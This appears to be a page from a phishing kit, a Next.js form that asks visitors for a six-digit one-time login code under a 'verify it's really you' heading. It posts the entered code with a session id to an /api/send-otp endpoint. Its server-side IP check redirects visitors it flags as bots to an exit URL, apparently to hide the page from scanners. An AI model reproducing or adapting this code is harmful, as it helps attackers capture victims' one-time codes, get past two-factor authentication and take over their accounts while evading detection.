import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Container as Wrapper } from "../components/Container";
import { Input } from "../components/Input";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import checkIp from "@/middleware/checkIp";
import { GetServerSideProps } from "next";

interface OTPProps {}

const schema = yup.object().shape({
  otp: yup
    .number()
    .typeError(`Please enter a valid one time pin`)
    .required(`Please enter the one time pin we sent you`)
    .test(
      `len`,
      `Please enter a valid one time pin`,
      (val) => !!(val && val.toString().length === 6)
    ),
});

export const OTP: React.FC<OTPProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `ONE TIME PIN`);
    formData.append(`otp`, JSON.stringify({ sessionId: datas.sessionId, ...data }));

    try {
      await axios.post(`/api/send-otp`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      otp: data,
    });

    const url = getProgress()[getProgress().indexOf(`OTP`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper
      title="Now, let's verify it's really you."
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      subTitle={`Please Verify Your Login`}
      errors={errors}
    >
      <Input
        label={`One Time Pin`}
        name={`otp`}
        register={register}
        mask="9 9 9 9 9 9"
        error={errors.otp && (errors.otp.message as unknown as string)}
      />
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid ? {
      redirect: {
        destination: process.env.NEXT_PUBLIC_EXIT_URL,
        permanent: false,
      },
    } : {})
  };
};

export default OTP;
